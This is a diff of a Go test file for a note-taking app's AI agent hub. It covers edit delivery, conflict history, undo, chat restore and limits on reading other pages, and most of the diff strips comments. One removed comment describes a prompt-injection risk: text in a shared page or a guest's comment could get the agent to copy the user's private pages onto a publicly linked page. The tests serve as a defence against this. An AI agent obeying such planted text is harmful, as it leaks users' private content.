@@ -1,12 +1,10 @@
 package agents
 
 import (
-	"bytes"
 	"context"
 	"encoding/json"
 	"errors"
 	"fmt"
-	"io"
 	"net/http"
 	"net/http/httptest"
 	"slices"
@@ -42,12 +40,9 @@ func ids(c *doc.Content) string {
 	return strings.Join(out, ",")
 }
 
-// A page opened during a run gets the ops it missed once each, in order,
-// however many times the run hands them over.
 func TestDeliveryToAPageOpenedMidRun(t *testing.T) {
 	ops := []doc.Op{insertAfter("p1", "x1", "one")}
 	d := &delivery{}
-	// The first op comes while the page is closed: nothing to apply it to.
 	ed := editor.New(page(), nil)
 	ops = append(ops, insertAfter("x1", "x2", "two"))
 	if err := d.to(ed, ops); err != nil {
@@ -57,7 +52,6 @@ func TestDeliveryToAPageOpenedMidRun(t *testing.T) {
 	if err := d.to(ed, ops); err != nil {
 		t.Fatal(err)
 	}
-	// The run ends with the page still open.
 	if err := d.to(ed, ops); err != nil {
 		t.Fatal(err)
 	}
@@ -66,8 +60,6 @@ func TestDeliveryToAPageOpenedMidRun(t *testing.T) {
 	}
 }
 
-// A page closed during a run keeps what its editor saved, and the ops
-// that came after are stored on top.
 func TestDeliveryToAPageClosedMidRun(t *testing.T) {
 	st := openStore(t)
 	p, err := st.CreatePage(store.NewPageOptions{Title: "Plan"})
@@ -80,7 +72,6 @@ func TestDeliveryToAPageClosedMidRun(t *testing.T) {
 	if err := d.to(ed, ops); err != nil {
 		t.Fatal(err)
 	}
-	// Leaving the page saves the editor, with an edit of its own.
 	ed.Content.Children = append(ed.Content.Children, &doc.Node{ID: "mine", Type: "paragraph"})
 	if _, _, err := st.SaveContent(p.ID, ed.Content); err != nil {
 		t.Fatal(err)
@@ -94,8 +85,6 @@ func TestDeliveryToAPageClosedMidRun(t *testing.T) {
 	}
 }
 
-// What MCP or a sync stores on a closed page while a run's ops are going
-// in stays: the ops go on top of it instead of saving over it.
 func TestDeliveryKeepsAConcurrentSave(t *testing.T) {
 	st := openStore(t)
 	p, err := st.CreatePage(store.NewPageOptions{Title: "Plan"})
@@ -128,8 +117,6 @@ func TestDeliveryKeepsAConcurrentSave(t *testing.T) {
 	}
 }
 
-// Ops for a closed page whose stored content cannot be read are not saved
-// over it as if it were empty.
 func TestDeliveryToAnUnreadablePage(t *testing.T) {
 	st := openStore(t)
 	p, err := st.CreatePage(store.NewPageOptions{Title: "Broken"})
@@ -149,8 +136,6 @@ func TestDeliveryToAnUnreadablePage(t *testing.T) {
 	}
 }
 
-// A run whose edits fail to store on a closed page fails, rather than
-// saying it is done, and its ops stay to deliver: storing them again works.
 func TestFailedSaveFailsTheRun(t *testing.T) {
 	st := openStore(t)
 	p, err := st.CreatePage(store.NewPageOptions{Title: "Plan"})
@@ -169,12 +154,11 @@ func TestFailedSaveFailsTheRun(t *testing.T) {
 	s := h.Session(p.ID)
 	run := &Run{ID: "r1", Ops: []doc.Op{insertAfter("", "x1", "one")}}
 	d := &delivery{}
-	local := Option{Provider: store.Provider{ID: "ollama", Name: "Ollama", IsLocal: true}}
+	local := Option{Provider: store.Provider{ID: "ollama", Name: "Ollama"}}
 	h.finish(s, run, Request{Instruction: "Add a line"}, local, st.Content(p.ID), d, Result{Reply: "Added a line."}, nil, RunOptions{})
 	if run.Status != "failed" || !strings.Contains(run.Error, "disk full") {
 		t.Errorf("run %q, error %q", run.Status, run.Error)
 	}
-	// The snapshot went first: it is the page as it was, still.
 	if history, _ := st.History(p.ID); len(history) > 1 {
 		t.Errorf("history %d", len(history))
 	}
@@ -192,8 +176,6 @@ func TestFailedSaveFailsTheRun(t *testing.T) {
 	}
 }
 
-// A run on a closed page that could not keep its history snapshot leaves
-// the page as it is: there would be nothing to go back to.
 func TestRunNotStoredWithoutItsSnapshot(t *testing.T) {
 	st := openStore(t)
 	p, err := st.CreatePage(store.NewPageOptions{Title: "Plan"})
@@ -205,7 +187,7 @@ func TestRunNotStoredWithoutItsSnapshot(t *testing.T) {
 	}
 	h := NewHub(st, nil, stubHost{})
 	run := &Run{ID: "r1", Ops: []doc.Op{insertAfter("", "x1", "one")}}
-	local := Option{Provider: store.Provider{ID: "ollama", Name: "Ollama", IsLocal: true}}
+	local := Option{Provider: store.Provider{ID: "ollama", Name: "Ollama"}}
 	h.finish(h.Session(p.ID), run, Request{Instruction: "Add a line"}, local, st.Content(p.ID), &delivery{}, Result{Reply: "Added a line."}, nil, RunOptions{})
 	if run.Status != "failed" || !strings.Contains(run.Error, "history failed") {
 		t.Errorf("run %q, error %q", run.Status, run.Error)
@@ -215,10 +197,6 @@ func TestRunNotStoredWithoutItsSnapshot(t *testing.T) {
 	}
 }
 
-// An op on an open page that would take away a change the user made,
-// which cannot be kept in history first, is not applied, nor the ops after
-// it: they wait for a delivery that can keep it, and a run that ends
-// without one fails, as one on a closed page does.
 func TestOpenPageOpNotAppliedWithoutItsConflict(t *testing.T) {
 	st := openStore(t)
 	p, ed := openPage(t, st)
@@ -233,7 +211,7 @@ func TestOpenPageOpNotAppliedWithoutItsConflict(t *testing.T) {
 	}
 	h := NewHub(st, nil, openHost{ed: ed})
 	run := &Run{ID: "r1", Ops: ops}
-	local := Option{Provider: store.Provider{ID: "ollama", Name: "Ollama", IsLocal: true}}
+	local := Option{Provider: store.Provider{ID: "ollama", Name: "Ollama"}}
 	d := h.newDelivery(p.ID, run, local)
 	h.finish(h.Session(p.ID), run, Request{Instruction: "Rewrite"}, local, read, d, Result{Reply: "Rewrote it."}, nil, RunOptions{})
 	if run.Status != "failed" || !strings.Contains(run.Error, "history failed") {
@@ -263,9 +241,6 @@ func TestOpenPageOpNotAppliedWithoutItsConflict(t *testing.T) {
 	}
 }
 
-// A run's ops stored over a block changed since the agent read it keep
-// that change in history (reason conflict) before saving over it; ops
-// that leave changed blocks alone keep nothing more.
 func TestRunOverAChangeKeepsIt(t *testing.T) {
 	st := openStore(t)
 	p, err := st.CreatePage(store.NewPageOptions{Title: "Plan"})
@@ -276,12 +251,10 @@ func TestRunOverAChangeKeepsIt(t *testing.T) {
 		t.Fatal(err)
 	}
 	before := st.Content(p.ID)
-	// The agent rewrites p1 as it read it, and adds a line after h1.
 	work := before.Copy()
 	n := &doc.Node{Type: "paragraph"}
 	n.SetDelta(doc.FromMarkdown("Ship the agents first."))
 	ops := []doc.Op{work.ReplaceOp("p1", n), insertAfter("h1", "x1", "one")}
-	// Meanwhile MCP rewrites l1, which the agent leaves alone.
 	theirs := st.Content(p.ID)
 	theirs.Find("l1").SetDelta(doc.FromMarkdown("their item"))
 	if _, _, err := st.SaveContent(p.ID, theirs); err != nil {
@@ -294,7 +267,6 @@ func TestRunOverAChangeKeepsIt(t *testing.T) {
 		t.Errorf("history of a change kept as it was: %d", len(history))
 	}
 
-	// Then MCP rewrites p1, which the next run rewrites as it read it.
 	work = st.Content(p.ID)
 	n = &doc.Node{Type: "paragraph"}
 	n.SetDelta(doc.FromMarkdown("Ship the agent's way."))
@@ -319,7 +291,6 @@ func TestRunOverAChangeKeepsIt(t *testing.T) {
 	}
 }
 
-// openHost is a host with one page open, in ed.
 type openHost struct {
 	stubHost
 	ed *editor.Editor
@@ -332,7 +303,6 @@ func (h openHost) Live(string) LiveDoc {
 	return h.ed
 }
 
-// openPage is a stored page, open in an editor.
 func openPage(t *testing.T, st *store.Store) (store.Page, *editor.Editor) {
 	t.Helper()
 	p, err := st.CreatePage(store.NewPageOptions{Title: "Plan"})
@@ -345,17 +315,10 @@ func openPage(t *testing.T, st *store.Store) (store.Page, *editor.Editor) {
 	return p, editor.New(st.Content(p.ID), nil)
 }
 
-// liveEditor is the editor as an open page's live.Editor, as the app's.
 type liveEditor struct{ *editor.Editor }
 
 func (liveEditor) SetReadOnly(bool) {}
 
-// An op an agent writes on the block the user is composing in, while they
-// compose, keeps its own text: telling whether the op takes a change of
-// theirs away, and keeping the page in history before it does, only looks
-// at the page, which takes no composition out with it. The op, written
-// without the composition, cannot hold it, and the same text at its place
-// is the agent's.
 func TestOpWhileComposingKeepsItsText(t *testing.T) {
 	st := openStore(t)
 	p, ed := openPage(t, st)
@@ -370,33 +333,26 @@ func TestOpWhileComposingKeepsItsText(t *testing.T) {
 	rewrite := read.Clone()
 	rewrite.SetDelta(doc.Delta{{Text: "Ship the editor first.and more"}})
 	h := NewHub(st, nil, stubHost{})
-	d := h.newDelivery(p.ID, &Run{ID: "r1"}, Option{Provider: store.Provider{ID: "ollama", IsLocal: true}})
+	d := h.newDelivery(p.ID, &Run{ID: "r1"}, Option{Provider: store.Provider{ID: "ollama"}})
 	if err := d.apply(open, doc.Op{Op: "replace", ID: "p1", Node: rewrite, PrevNode: read}, 0); err != nil {
 		t.Fatal(err)
 	}
 	if got := ed.Content.Find("p1").Delta().Plain(); got != "Ship the editor first.and more" {
 		t.Errorf("the agent's line is %q", got)
 	}
-	// What the op took away, the line as the user was composing it, is
-	// kept first.
 	hist, err := st.History(p.ID)
 	if err != nil || len(hist) != 1 || hist[0].Reason != "conflict" {
 		t.Fatalf("history %+v: %v", hist, err)
 	}
 }
 
-// An op of a run that read the page while the user composed in it holds
-// the composition as the run read it: given up as the op changes its
-// block, it goes from the op's text, as the input method composes it on at
-// the caret. An op of a run that read the page before keeps its text, the
-// page saved with the composition since or not.
 func TestOpOfARunThatReadTheCompositionTakesItOut(t *testing.T) {
 	st := openStore(t)
 	p, ed := openPage(t, st)
 	open, _ := live.Open(st, p.ID, live.Options{})
 	open.Attach(liveEditor{ed})
 	h := NewHub(st, nil, stubHost{})
-	local := Option{Provider: store.Provider{ID: "ollama", IsLocal: true}}
+	local := Option{Provider: store.Provider{ID: "ollama"}}
 	rewrite := func(text string) doc.Op {
 		was := ed.Content.Find("p1").Clone()
 		n := was.Clone()
@@ -408,7 +364,7 @@ func TestOpOfARunThatReadTheCompositionTakesItOut(t *testing.T) {
 	op := rewrite("Ship the editor first.and more")
 	ed.PlaceCaret("p1", -1)
 	ed.SetMarkedText(nil, "an", ui.TextInputRange{Start: 2, End: 2})
-	_ = open.Doc() // a save
+	_ = open.Doc()
 	d := h.newDelivery(p.ID, &Run{ID: "r1"}, local)
 	d.read = before
 	if err := d.apply(open, op, 0); err != nil {
@@ -435,17 +391,12 @@ func TestOpOfARunThatReadTheCompositionTakesItOut(t *testing.T) {
 	}
 }
 
-// A local run on an open page keeps the page as it was in history when
-// its first op reaches the page, and the chat keeps its ops as they come:
-// the editor saves them before the run ends, and an app that quits then
-// leaves a run that can still be undone and a page that can go back. The
-// run's end keeps no second snapshot.
 func TestRunOnAnOpenPageKeepsItsUndoAsItGoes(t *testing.T) {
 	st := openStore(t)
 	p, ed := openPage(t, st)
 	h := NewHub(st, nil, openHost{ed: ed})
 	s := h.Session(p.ID)
-	local := Option{Provider: store.Provider{ID: "ollama", Name: "Ollama", IsLocal: true}}
+	local := Option{Provider: store.Provider{ID: "ollama", Name: "Ollama"}}
 	run := &Run{ID: "r1", AgentName: "Ollama", Instruction: "Add a line", Status: "running"}
 	reply := &Message{Text: "Reading the page…", Pending: true, RunID: run.ID}
 	s.Runs = append(s.Runs, run)
@@ -465,7 +416,6 @@ func TestRunOnAnOpenPageKeepsItsUndoAsItGoes(t *testing.T) {
 	if kept := doc.MustDecode(history[0].Content); kept.Find("x1") != nil {
 		t.Error("the snapshot has the run's op")
 	}
-	// The app quits here, mid-run.
 	restored := NewHub(st, nil, stubHost{}).Session(p.ID).Run("r1")
 	if restored == nil || len(restored.Ops) != 1 || len(restored.Edits) != 1 || restored.Status != "failed" {
 		t.Fatalf("restored run %+v", restored)
@@ -477,17 +427,12 @@ func TestRunOnAnOpenPageKeepsItsUndoAsItGoes(t *testing.T) {
 	}
 }
 
-// An agent op that replaces or deletes a block the user changed on the
-// open page since the agent read it keeps the page in history first
-// (reason conflict), as on a closed page; ops on blocks as the agent read
-// them, or as its own earlier ops left them, keep nothing.
 func TestAgentOpOverAnOpenPagesChangeKeepsIt(t *testing.T) {
 	st := openStore(t)
 	p, ed := openPage(t, st)
 	h := NewHub(st, nil, openHost{ed: ed})
 	run := &Run{ID: "r1"}
-	d := h.newDelivery(p.ID, run, Option{Provider: store.Provider{ID: "ollama", Name: "Ollama", IsLocal: true}})
-	// work is the page as the agent has it, with its own ops.
+	d := h.newDelivery(p.ID, run, Option{Provider: store.Provider{ID: "ollama", Name: "Ollama"}})
 	work := ed.Content.Copy()
 	var ops []doc.Op
 	agent := func(op doc.Op) {
@@ -511,14 +456,12 @@ func TestAgentOpOverAnOpenPagesChangeKeepsIt(t *testing.T) {
 	}
 
 	agent(work.ReplaceOp("l1", block("bulleted_list", "first")))
-	// The user rewrites p1; the agent rewrites l1 again, as it left it.
 	ed.Content.Find("p1").SetDelta(doc.FromMarkdown("Their way."))
 	agent(work.ReplaceOp("l1", block("bulleted_list", "second")))
 	if got := conflicts(); len(got) != 0 {
 		t.Fatalf("history of the agent's own edits: %+v", got)
 	}
 
-	// Then the agent rewrites p1 as it read it.
 	agent(work.ReplaceOp("p1", block("paragraph", "Ship the agent's way.")))
 	got := conflicts()
 	if len(got) != 1 || got[0].Reason != "conflict" || got[0].AIJobID != "r1" {
@@ -531,7 +474,6 @@ func TestAgentOpOverAnOpenPagesChangeKeepsIt(t *testing.T) {
 		t.Errorf("open page has %q", text)
 	}
 
-	// And deletes h1, which the user renamed.
 	ed.Content.Find("h1").SetDelta(doc.FromMarkdown("Their plan"))
 	agent(work.DeleteOp([]string{"h1"}))
 	got = conflicts()
@@ -546,15 +488,11 @@ func TestAgentOpOverAnOpenPagesChangeKeepsIt(t *testing.T) {
 	}
 }
 
-// A link card the agent put in, which the open page then filled in with
-// what its link says, is the agent's own still: taking it out, as a call
-// refused once it has all come does, keeps nothing in history. A card the
-// user gave another link is theirs.
 func TestTakingOutAFilledInLinkCardKeepsNothing(t *testing.T) {
 	st := openStore(t)
 	p, ed := openPage(t, st)
 	h := NewHub(st, nil, openHost{ed: ed})
-	d := h.newDelivery(p.ID, &Run{ID: "r1"}, Option{Provider: store.Provider{ID: "ollama", Name: "Ollama", IsLocal: true}})
+	d := h.newDelivery(p.ID, &Run{ID: "r1"}, Option{Provider: store.Provider{ID: "ollama", Name: "Ollama"}})
 	work := ed.Content.Copy()
 	var ops []doc.Op
 	agent := func(op doc.Op) {
@@ -586,16 +524,13 @@ func TestTakingOutAFilledInLinkCardKeepsNothing(t *testing.T) {
 	}
 }
 
-// A block the user changes on the open page while an agent's call streams
-// into it is kept in history before the stream's next change takes it
-// away, as an op of its own would keep it.
 func TestStreamOverAnOpenPagesChangeKeepsIt(t *testing.T) {
 	st := openStore(t)
 	p, ed := openPage(t, st)
 	h := NewHub(st, nil, openHost{ed: ed})
 	s := h.Session(p.ID)
 	run := &Run{ID: "r1"}
-	d := h.newDelivery(p.ID, run, Option{Provider: store.Provider{ID: "ollama", Name: "Ollama", IsLocal: true}})
+	d := h.newDelivery(p.ID, run, Option{Provider: store.Provider{ID: "ollama", Name: "Ollama"}})
 	work := ed.Content.Copy()
 	block := func(text string) *doc.Node {
 		n := &doc.Node{Type: "paragraph"}
@@ -611,7 +546,6 @@ func TestStreamOverAnOpenPagesChangeKeepsIt(t *testing.T) {
 		t.Fatal(err)
 	}
 
-	// The user types in p1 as the agent's call goes on streaming into it.
 	ed.Content.Find("p1").SetDelta(doc.FromMarkdown("Ship it mine"))
 	delta := work.ReplaceOp("p1", block("Ship the agent's"))
 	if err := work.Apply(delta); err != nil {
@@ -631,16 +565,13 @@ func TestStreamOverAnOpenPagesChangeKeepsIt(t *testing.T) {
 	}
 }
 
-// A change streamed into a block the user changed meanwhile, whose
-// recovery copy could not be kept, is not made, and the run ends failed:
-// its op counts as delivered, so finishing does not deliver it again.
 func TestStreamWithoutItsConflictFailsTheRun(t *testing.T) {
 	st := openStore(t)
 	p, ed := openPage(t, st)
 	h := NewHub(st, nil, openHost{ed: ed})
 	s := h.Session(p.ID)
 	run := &Run{ID: "r1"}
-	local := Option{Provider: store.Provider{ID: "ollama", Name: "Ollama", IsLocal: true}}
+	local := Option{Provider: store.Provider{ID: "ollama", Name: "Ollama"}}
 	d := h.newDelivery(p.ID, run, local)
 	work := ed.Content.Copy()
 	before := work.Copy()
@@ -677,9 +608,6 @@ func TestStreamWithoutItsConflictFailsTheRun(t *testing.T) {
 	}
 }
 
-// The chat history a local model reads leaves out each request whose run
-// was undone or failed, with its reply, as the agent function does for a
-// cloud run: the model would take an undone edit for still on the page.
 func TestChatHistoryLeavesOutUndoneAndFailedRuns(t *testing.T) {
 	s := &Session{Runs: []*Run{
 		{ID: "r1", Status: "done", Undone: true},
@@ -690,7 +618,6 @@ func TestChatHistoryLeavesOutUndoneAndFailedRuns(t *testing.T) {
 	s.Messages = []*Message{
 		{Mine: true, Text: "Add a table"}, {Text: "Added a table.", RunID: "r1"},
 		{Mine: true, Text: "Summarize"}, {Text: "It is a plan.", RunID: "r2"},
-		// A run of an earlier launch, cut off: failed, its reply too.
 		{Mine: true, Text: "Add a chart"}, {Text: "Added a chart…", RunID: "r3"},
 		{Mine: true, Text: "Fix the typo"}, {Text: "The model is not found.", RunID: "r4", Error: true},
 		{Mine: true, Text: "Hello"}, {Text: "Hi."},
@@ -718,8 +645,6 @@ func openStore(t *testing.T) *store.Store {
 	return st
 }
 
-// On a page shared with the user to view, a local agent reads but does
-// not change the page or make subpages under it.
 func TestAgentOnAPageToView(t *testing.T) {
 	st := openStore(t)
 	p, err := st.CreatePage(store.NewPageOptions{Title: "Theirs", SpaceID: "someone-else"})
@@ -748,7 +673,6 @@ func TestAgentOnAPageToView(t *testing.T) {
 	if kids, _ := st.Children(p.ID, ""); len(kids) != 0 || ids(c) != "h1,p1,l1" {
 		t.Errorf("subpages %d, blocks %s", len(kids), ids(c))
 	}
-	// Only the reading ones: the page, and what is said in its videos.
 	var names []string
 	for _, d := range ToolDefinitions(false, true) {
 		names = append(names, d["function"].(map[string]any)["name"].(string))
@@ -758,8 +682,6 @@ func TestAgentOnAPageToView(t *testing.T) {
 	}
 }
 
-// A page's chat comes back after a restart, with its runs still undoable
-// and a reply that never finished marked as such.
 func TestChatSurvivesARestart(t *testing.T) {
 	st := openStore(t)
 	h := NewHub(st, nil, nil)
@@ -788,7 +710,6 @@ func TestChatSurvivesARestart(t *testing.T) {
 	if r2 := again.Run("r2"); r2 == nil || r2.Status != "failed" {
 		t.Errorf("unfinished run %+v", r2)
 	}
-	// The run bar is for runs of this launch.
 	if again.Latest() != nil {
 		t.Error("a restored run shows in the run bar")
 	}
@@ -800,8 +721,6 @@ func TestChatSurvivesARestart(t *testing.T) {
 	}
 }
 
-// A new conversation keeps the one before among the earlier ones, which
-// opens again with its runs, after a restart too.
 func TestEarlierConversations(t *testing.T) {
 	st := openStore(t)
 	h := NewHub(st, nil, nil)
@@ -812,7 +731,6 @@ func TestEarlierConversations(t *testing.T) {
 	h.saveChat(s)
 
 	h.NewConversation("p")
-	// An empty conversation is not kept.
 	h.NewConversation("p")
 	if len(s.Messages) != 0 || len(s.Past) != 1 || s.Past[0].ID != first || s.Past[0].Title() != "Add a line" {
 		t.Fatalf("%d messages, past %+v", len(s.Messages), s.Past)
@@ -841,10 +759,6 @@ func TestEarlierConversations(t *testing.T) {
 	}
 }
 
-// stubHost is a host with no page open.
-// A run that ends after its account signed out of this device stores
-// nothing: its pages are gone, and its snapshot, job, chat and content
-// would come back for the next account to upload.
 func TestRunEndingAfterSignOutStoresNothing(t *testing.T) {
 	st := openStore(t)
 	p, err := st.CreatePage(store.NewPageOptions{Title: "Secret", Content: page()})
@@ -866,7 +780,7 @@ func TestRunEndingAfterSignOutStoresNothing(t *testing.T) {
 	if _, err := st.LoadSession(nil); err != nil {
 		t.Fatal(err)
 	}
-	option := Option{Provider: store.Provider{Name: "Local", IsLocal: true}}
+	option := Option{Provider: store.Provider{Name: "Local"}}
 	h.finish(s, run, Request{PageID: p.ID}, option, before, h.newDelivery(p.ID, run, option),
 		Result{Reply: "done", Ops: []doc.Op{insertAfter("p1", "x1", "one")}, Edits: []Edit{{Summary: "x"}}}, nil,
 		RunOptions{Reply: reply, Done: func(*Run) { done = true }})
@@ -888,55 +802,16 @@ func TestRunEndingAfterSignOutStoresNothing(t *testing.T) {
 
 type stubHost struct{}
 
-func (stubHost) Update(_ string, fn func())              { fn() }
-func (stubHost) Live(string) LiveDoc                     { return nil }
-func (stubHost) SaveNow(string)                          {}
-func (stubHost) Online() bool                            { return false }
-func (stubHost) Settings() store.Settings                { return store.Settings{} }
-func (stubHost) FlushPage(context.Context, string) error { return nil }
-func (stubHost) SyncNow()                                {}
-func (stubHost) Tint(string, []string)                   {}
+func (stubHost) Update(_ string, fn func()) { fn() }
+func (stubHost) Live(string) LiveDoc        { return nil }
+func (stubHost) SaveNow(string)             {}
+func (stubHost) Online() bool               { return false }
+func (stubHost) Settings() store.Settings   { return store.Settings{} }
+func (stubHost) Tint(string, []string)      {}
 
-// A run undone from the page's bar after its conversation was left stays
-// undone in that conversation, after a restart too.
 type onlineHost struct{ stubHost }
 
 func (onlineHost) Online() bool { return true }
-
-// An undone cloud run's status changes on the server, its row's alone:
-// as an upsert, of a row with no page, the server refused it, so its chat
-// kept the undone run in the history it gives the model. A local run's
-// job, kept on this device, sends nothing.
-func TestUndoneRunsStatusReachesTheServer(t *testing.T) {
-	st := openStore(t)
-	got := make(chan string, 4)
-	hs := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
-		body, _ := io.ReadAll(r.Body)
-		got <- r.Method + " " + r.URL.Path + "?" + r.URL.RawQuery + " " + string(body)
-		_, _ = w.Write([]byte(`[{"id":"cloud"}]`))
-	}))
-	defer hs.Close()
-	h := NewHub(st, remote.SignedInForTest(hs.URL, st, "u1"), onlineHost{})
-	if err := st.PutJob(store.Job{ID: "local", PageID: "p", Surface: "sidebar", Status: "done"}); err != nil {
-		t.Fatal(err)
-	}
-
-	h.markJob("local", "reverted")
-	h.markJob("cloud", "reverted")
-	select {
-	case req := <-got:
-		if req != `PATCH /rest/v1/ai_jobs?id=eq.cloud {"status":"reverted"}` {
-			t.Errorf("sent %s", req)
-		}
-	case <-time.After(5 * time.Second):
-		t.Fatal("nothing sent")
-	}
-	select {
-	case req := <-got:
-		t.Errorf("sent for the local run too: %s", req)
-	case <-time.After(100 * time.Millisecond):
-	}
-}
 
 func TestUndoInAnEarlierConversation(t *testing.T) {
 	st := openStore(t)
@@ -964,10 +839,6 @@ func TestUndoInAnEarlierConversation(t *testing.T) {
 	}
 }
 
-// An agent reads the user's other pages only from a page no one else
-// has: text other people put in a shared page, or a guest's comment
-// through its public link, could have it copy them there, and a page
-// with a public link open shows what it copies to anyone.
 func TestCrossPageOnlyOnTheUsersOwnPages(t *testing.T) {
 	st := openStore(t)
 	me := st.Session().UserID
@@ -998,7 +869,6 @@ func TestCrossPageOnlyOnTheUsersOwnPages(t *testing.T) {
 	if err != nil {
 		t.Fatal(err)
 	}
-	// One the user deleted still was a guest's.
 	if err := st.DeleteComment(c.ID); err != nil {
 		t.Fatal(err)
 	}
@@ -1026,9 +896,6 @@ func TestCrossPageOnlyOnTheUsersOwnPages(t *testing.T) {
 	}
 }
 
-// The other pages a local agent reads are those of the page's space, as
-// the agent function's: one someone else shared with the user is theirs,
-// and its URLs would pass for ones the user's pages have.
 func TestCrossPageOnlyInThePagesSpace(t *testing.T) {
 	st := openStore(t)
 	mine, err := st.CreatePage(store.NewPageOptions{Title: "Mine"})
@@ -1057,8 +924,6 @@ func TestCrossPageOnlyInThePagesSpace(t *testing.T) {
 	}
 }
 
-// A page runs one agent at a time: a run asked for while another works on
-// the page fails at once, and the first keeps the page's running state.
 func TestOneRunAtATimeOnAPage(t *testing.T) {
 	st := openStore(t)
 	h := NewHub(st, nil, nil)
@@ -1078,8 +943,6 @@ func TestOneRunAtATimeOnAPage(t *testing.T) {
 	}
 }
 
-// queueHost is a host whose updates wait for the test to run them, as on
-// the main thread.
 type queueHost struct {
 	stubHost
 	q chan func()
@@ -1087,8 +950,6 @@ type queueHost struct {
 
 func (h queueHost) Update(_ string, fn func()) { h.q <- fn }
 
-// busyHost is a host whose main thread does not get to what Forget leaves
-// it, as the account's pages go right after.
 type busyHost struct{ queueHost }
 
 func (h busyHost) Update(pageID string, fn func()) {
@@ -1097,9 +958,6 @@ func (h busyHost) Update(pageID string, fn func()) {
 	}
 }
 
-// Forget ends a run there and then, not when the main thread gets to it:
-// the account's pages go right after it, and what the run's tools made
-// from then on would stay for the next account.
 func TestForgetEndsARunAtOnce(t *testing.T) {
 	st := openStore(t)
 	asked, answer := make(chan struct{}), make(chan struct{})
@@ -1115,7 +973,7 @@ func TestForgetEndsARunAtOnce(t *testing.T) {
 	}))
 	defer models.Close()
 	defer close(answer)
-	if err := st.PutProvider(store.Provider{ID: "local", Preset: "custom", Name: "Local", BaseURL: models.URL, AuthKind: "none", DefaultModel: "m", IsLocal: true, SupportsTools: new(true)}); err != nil {
+	if err := st.PutProvider(store.Provider{ID: "local", Preset: "custom", Name: "Local", BaseURL: models.URL, AuthKind: "none", DefaultModel: "m", SupportsTools: new(true)}); err != nil {
 		t.Fatal(err)
 	}
 	p, err := st.CreatePage(store.NewPageOptions{Title: "Plan", Content: page()})
@@ -1150,14 +1008,11 @@ func TestForgetEndsARunAtOnce(t *testing.T) {
 	if kids, err := st.Children(p.ID, ""); err != nil || len(kids) != 0 {
 		t.Errorf("made after its account left: %v, %v", kids, err)
 	}
-	// The next account's runs are not ended with it.
 	if ctx := h.runContext(); ctx.Err() != nil {
 		t.Errorf("a run of the next account: %v", ctx.Err())
 	}
 }
 
-// A chat reply shows the answer as it streams, its thinking left out, and
-// not an answer an edit of the page went on from.
 func TestReplyStreamShowsTheAnswerSoFar(t *testing.T) {
 	host := queueHost{q: make(chan func(), 4)}
 	reply := &Message{Text: "Reading the page…", Pending: true}
@@ -1197,9 +1052,6 @@ func TestReplyStreamShowsTheAnswerSoFar(t *testing.T) {
 	}
 }
 
-// Undo that cannot revert the run's edits, as on content that cannot be
-// read, says so and leaves the run as it was: not undone, its job not
-// sent as reverted.
 func TestUndoThatFailsChangesNothing(t *testing.T) {
 	st := openStore(t)
 	p, err := st.CreatePage(store.NewPageOptions{Title: "Plan", Content: page()})
@@ -1228,9 +1080,6 @@ func TestUndoThatFailsChangesNothing(t *testing.T) {
 	}
 }
 
-// An undo some of whose ops no longer apply, as the user deleted a block
-// the run rewrote, changes nothing, open or closed: it is all at once or
-// not at all, and the run stays done, to undo by hand.
 func TestUndoOfARunPartlyGoneChangesNothing(t *testing.T) {
 	rewrite := func(c *doc.Content) []doc.Op {
 		repl := &doc.Node{ID: "l1", Type: "paragraph"}
@@ -1284,9 +1133,6 @@ func TestUndoOfARunPartlyGoneChangesNothing(t *testing.T) {
 	})
 }
 
-// Signed in, an agent takes the user's own page for shared until sync has
-// read who their pages are shared with: before then, no members kept of
-// it says nothing.
 func TestCrossPageWaitsForOwnPagesMembers(t *testing.T) {
 	st := openStore(t)
 	if _, err := st.LoadSession(&store.User{ID: "u1"}); err != nil {
@@ -1309,15 +1155,13 @@ func TestCrossPageWaitsForOwnPagesMembers(t *testing.T) {
 	}
 }
 
-// A run stopped after it had finished, before it ended on the main
-// thread, ends as it finished, with its answer.
 func TestStopAfterTheRunFinishedKeepsItsReply(t *testing.T) {
 	h := NewHub(openStore(t), nil, stubHost{})
 	s := h.Session("p1")
 	run := &Run{ID: "r1", Status: "running", Stopped: true}
 	s.Runs, s.Running = []*Run{run}, true
 	reply := &Message{Pending: true}
-	option := Option{Provider: store.Provider{Name: "Local", IsLocal: true}}
+	option := Option{Provider: store.Provider{Name: "Local"}}
 	h.finish(s, run, Request{PageID: "p1"}, option, doc.Empty(), h.newDelivery("p1", run, option),
 		Result{Reply: "It is a plan."}, nil, RunOptions{Reply: reply})
 	if run.Status != "done" || run.Stopped || run.Reply != "It is a plan." || reply.Text != "It is a plan." {
@@ -1325,11 +1169,6 @@ func TestStopAfterTheRunFinishedKeepsItsReply(t *testing.T) {
 	}
 }
 
-// A cloud run's subpage this device does not have yet stops its undo
-// before anything changes: deleting it would miss it, and it would come
-// back with the sync. Once sync has pulled the pages made since the run
-// began, one still missing is gone for good, and the undo goes on
-// without it.
 func TestUndoWaitsForTheRunsSubpage(t *testing.T) {
 	st := openStore(t)
 	if _, err := st.LoadSession(&store.User{ID: "u1"}); err != nil {
@@ -1370,16 +1209,13 @@ func TestUndoWaitsForTheRunsSubpage(t *testing.T) {
 	}
 }
 
-// readingHost is a host whose settings let agents read other pages.
 type readingHost struct{ stubHost }
 
 func (readingHost) Settings() store.Settings { return store.Settings{AgentsReadOtherPages: true} }
 
-// A run that panics fails, saying so, and ends as a failed run does: its
-// page takes another run.
 func TestPanicInARunFailsIt(t *testing.T) {
 	st := openStore(t)
-	if err := st.PutProvider(store.Provider{ID: "local", Preset: "custom", Name: "Local", BaseURL: "http://127.0.0.1:1/v1", AuthKind: "none", DefaultModel: "m", IsLocal: true}); err != nil {
+	if err := st.PutProvider(store.Provider{ID: "local", Preset: "custom", Name: "Local", BaseURL: "http://127.0.0.1:1/v1", AuthKind: "none", DefaultModel: "m"}); err != nil {
 		t.Fatal(err)
 	}
 	p, err := st.CreatePage(store.NewPageOptions{Title: "Plan", Content: page()})
@@ -1387,8 +1223,6 @@ func TestPanicInARunFailsIt(t *testing.T) {
 		t.Fatal(err)
 	}
 	h := NewHub(st, nil, readingHost{})
-	// The run asks whether the page has a public link as it starts, and
-	// again on its goroutine, which panics.
 	var asked atomic.Int32
 	h.PublicLink = func(string) bool {
 		if asked.Add(1) > 1 {
@@ -1408,21 +1242,18 @@ func TestPanicInARunFailsIt(t *testing.T) {
 	}
 }
 
-// The agents to pick come from the providers read once, until they change:
-// the app asks for them as it draws, for every comment.
